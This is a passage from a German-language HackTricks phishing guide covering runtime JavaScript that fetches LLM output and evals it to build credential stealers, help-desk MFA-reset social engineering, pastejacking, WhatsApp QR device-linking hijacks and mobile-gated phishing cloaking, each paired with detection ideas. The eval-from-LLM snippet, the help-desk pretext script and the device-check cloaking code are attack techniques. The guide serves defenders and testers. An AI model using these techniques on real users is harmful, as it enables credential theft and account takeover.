fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generierter Code personalisiert den Lockvogel (z. B. LogoKit token parsing) und sendet creds an den prompt-hidden endpoint.

**Evasion traits**
- Traffic trifft bekannte LLM-Domains oder seriöse CDN-Proxys; manchmal via WebSockets zu einem Backend.
- Kein statisches Payload; bösartiges JS existiert nur nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen **unique** Stealer pro Session.

**Detection ideas**
- Sandboxes mit aktiviertem JS ausführen; **runtime `eval`/dynamic script creation sourced from LLM responses** markieren.
- Front-end POSTs an LLM APIs jagen, direkt gefolgt von `eval`/`Function` auf zurückgegebenem Text.
- Alarm bei nicht genehmigten LLM-Domains im Client-Traffic plus anschließenden Credential-POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Neben klassischem push-bombing erzwingen Operatoren während des Helpdesk-Anrufs einfach **eine neue MFA registration** und machen damit das bestehende Token des Users ungültig.  Jeder anschließende Login-Prompt wirkt dem Opfer legitim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor für AzureAD/AWS/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** **innerhalb von Minuten von derselben IP** auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können heimlich bösartige Befehle aus einer kompromittierten oder typosquatted Webpage in die Zwischenablage des Opfers kopieren und den Benutzer dann dazu bringen, sie in **Win + R**, **Win + X** oder ein Terminal-Fenster einzufügen, wodurch beliebiger Code ohne Download oder Anhang ausgeführt wird.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Eine Lockseite (z. B. ein gefälschter Ministry/CERT-„channel“) zeigt einen WhatsApp Web/Desktop QR und weist das Opfer an, ihn zu scannen, wodurch der Angreifer unbemerkt als **linked device** hinzugefügt wird.
* Der Angreifer erhält sofort Chat-/Kontakt-Sichtbarkeit, bis die Sitzung entfernt wird. Opfer sehen möglicherweise später eine Benachrichtigung über ein „new device linked“; Verteidiger können nach unerwarteten device-link-Ereignissen kurz nach Besuchen auf nicht vertrauenswürdigen QR-Seiten suchen.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatoren schirmen ihre phishing-Flows zunehmend hinter einer einfachen Geräteprüfung ab, damit Desktop-Crawler die finalen Seiten nie erreichen. Ein häufiges Muster ist ein kleines Skript, das auf ein touch-fähiges DOM prüft und das Ergebnis an einen Server-Endpunkt sendet; nicht-mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobile Benutzer den vollständigen Flow sehen.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js`-Logik (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server-Verhalten, das häufig beobachtet wird:
- Setzt beim ersten Laden ein Session-Cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei nachfolgenden GETs ein 500 (oder einen Platzhalter) zurück, wenn `is_mobile=false`; liefert Phishing nur, wenn `true`.

Such- und Erkennungs-Heuristiken:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Sequenz von `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für non-mobile; legitime mobile Opferpfade liefern 200 mit nachfolgendem HTML/JS.
- Seiten blockieren oder genauer prüfen, die Inhalte ausschließlich auf `ontouchstart` oder ähnliche Geräteprüfungen stützen.

Defence-Tipps:
- Crawler mit mobile-ähnlichen Fingerprints und aktiviertem JS ausführen, um gated content sichtbar zu machen.
- Auf verdächtige 500-Antworten nach `POST /detect` auf neu registrierten Domains alarmieren.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
